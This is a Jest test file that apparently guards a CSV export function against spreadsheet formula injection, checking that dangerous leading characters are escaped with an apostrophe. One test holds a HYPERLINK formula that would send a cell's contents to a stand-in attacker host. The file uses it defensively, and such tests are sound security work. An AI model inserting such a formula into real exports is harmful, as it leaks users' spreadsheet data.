/**
 * DEC-022 — CSV / formula-injection guard, pinned at the export SEAM.
 *
 * These drive `downloadCsv()` itself (default jsdom env) and assert on the
 * CSV it hands to the Blob — NOT `Papa.unparse` in isolation. So a future
 * "cleanup" that drops `escapeFormulae: true` from export.ts fails HERE,
 * which is the whole point of the guard (Bima/DoD): the test proves the
 * seam escapes, not merely that the library *can*.
 */
import Papa from "papaparse";
import { downloadCsv } from "../export";

const OrigBlob = global.Blob;
const origCreate = URL.createObjectURL;
const origRevoke = URL.revokeObjectURL;
let csvParts: string[] = [];
let clickSpy: jest.SpyInstance;

beforeEach(() => {
  csvParts = [];
  // This jsdom Blob has no .text(); capture the CSV at the constructor seam
  // (downloadCsv calls `new Blob([csv], …)`), recording parts[0] verbatim.
  global.Blob = class {
    constructor(parts: ReadonlyArray<unknown>) {
      csvParts.push(String(parts[0]));
    }
  } as unknown as typeof Blob;
  // jsdom doesn't implement object-URL APIs; stub them. revoke stays a
  // callable no-op so downloadCsv's trailing setTimeout(revoke) can't throw.
  URL.createObjectURL = jest.fn(() => "blob:mock") as unknown as typeof URL.createObjectURL;
  URL.revokeObjectURL = jest.fn() as unknown as typeof URL.revokeObjectURL;
  clickSpy = jest
    .spyOn(HTMLAnchorElement.prototype, "click")
    .mockImplementation(() => {});
});

afterEach(() => {
  clickSpy.mockRestore();
  global.Blob = OrigBlob;
  URL.createObjectURL = origCreate;
  URL.revokeObjectURL = origRevoke;
});

/** Run downloadCsv and return the exact CSV text it serialized into the Blob. */
async function captureCsv(
  rows: ReadonlyArray<Record<string, unknown>>,
): Promise<string> {
  downloadCsv("export", rows);
  const csv = csvParts[0];
  if (csv === undefined) throw new Error("downloadCsv did not construct a Blob");
  // Flush downloadCsv's pending setTimeout(revoke) while the mock is still
  // installed, so afterEach can restore the (jsdom-undefined) original safely.
  await new Promise<void>((resolve) => setTimeout(resolve, 0));
  return csv;
}

/** Parse a single-row CSV back into its first data record (apostrophe markers
 *  are literal cell content, so they survive the round-trip). */
function firstRow(csv: string): Record<string, string> {
  return Papa.parse<Record<string, string>>(csv, {
    header: true,
    skipEmptyLines: false,
  }).data[0];
}

describe("downloadCsv — escapeFormulae guard (DEC-022)", () => {
  test("prefixes string cells leading with = + - @ with an apostrophe", async () => {
    const row = firstRow(
      await captureCsv([{ eq: "=A1", plus: "+1", minus: "-cmd", at: "@SUM(A1)" }]),
    );
    expect(row.eq).toBe("'=A1");
    expect(row.plus).toBe("'+1");
    expect(row.minus).toBe("'-cmd");
    expect(row.at).toBe("'@SUM(A1)");
  });

  test("neutralizes a real HYPERLINK exfiltration payload", async () => {
    const payload = '=HYPERLINK("http://evil.example/?x="&A1,"ok")';
    const row = firstRow(await captureCsv([{ product: payload }]));
    expect(row.product).toBe(`'${payload}`);
    expect(row.product.startsWith("'=")).toBe(true);
  });

  test("leaves benign string cells untouched (internal '-' is not a lead)", async () => {
    const row = firstRow(
      await captureCsv([{ sku: "WIDGET-001", name: "Blue Widget" }]),
    );
    expect(row.sku).toBe("WIDGET-001");
    expect(row.name).toBe("Blue Widget");
  });

  test('does NOT prefix a numeric -5, but DOES prefix the string "-5+1"', async () => {
    const row = firstRow(await captureCsv([{ qty: -5, formula: "-5+1" }]));
    expect(row.qty).toBe("-5"); // number path → cannot be a formula → untouched
    expect(row.formula).toBe("'-5+1"); // string leading with '-' → neutralized
  });

  test("prefixes whitespace-lead injections (TAB, CR)", async () => {
    // Line-terminator cells are fiddly to round-trip, so assert the apostrophe
    // marker directly on the serialized seam output.
    const csv = await captureCsv([{ tabbed: "\t=cmd", carriage: "\r=cmd" }]);
    expect(csv).toContain("'\t=cmd");
    expect(csv).toContain("'\r=cmd");
  });
});
